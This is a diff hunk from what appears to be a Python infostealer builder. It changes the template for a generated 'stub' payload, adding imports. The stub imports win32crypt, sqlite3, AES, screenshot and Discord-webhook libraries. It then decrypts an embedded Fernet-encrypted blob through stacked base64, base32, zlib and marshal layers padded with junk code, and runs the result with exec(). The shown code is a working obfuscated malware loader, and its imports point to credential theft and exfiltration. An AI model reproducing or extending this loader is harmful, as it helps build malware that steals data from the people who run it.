@@ -98,7 +98,7 @@ newdata = encrypted_data.decode()
 hex_str = newdata.encode().hex()
 
 
-stub = f"""import sqlite3, ctypes,winreg, mss, sys, os, wmi, win32api, platform, uuid, psutil, time, shutil, base64\nimport win32crypt, json, threading, requests, dhooks, re, subprocess\nfrom Crypto.Cipher import AES\n__VareObfuscator__ = ''
+stub = f"""import sqlite3, ctypes,winreg,pygetwindow, mss, sys, os, wmi, win32api, platform, uuid, psutil, time, GPUtil, shutil, pythoncom, base64\nimport win32crypt, json, threading, requests, dhooks, re, subprocess\nfrom Crypto.Cipher import AES\n__VareObfuscator__ = ''
 {junkgenerator(10)}
 import base64 as ______;import marshal as ____;import zlib as __________;from cryptography.fernet import Fernet;import base64;__mikey__="{base64.b64encode(stubkey).decode()}";mydata="{hex_str}";__vare__ = lambda x: ____.loads(__________.decompress(______.b32decode(______.b64decode(x[::-1]))));__mycip__= Fernet(base64.b64decode(__mikey__));__step1__=bytes.fromhex(mydata);__step2__=__mycip__.decrypt(__step1__);__decr__=base64.b64decode(__step2__);__decrdata__=__decr__;__gotnew__=base64.b32decode(__decr__);__newdecr__={random.randint(999999,999999999999)};__getnew__=__newdecr__;__myb64code__=base64.b64decode(__gotnew__);__myb64codee__=base64.b64decode(__myb64code__);___ = __myb64codee__;exec(__vare__(___))
 {junkgenerator(10)}"""
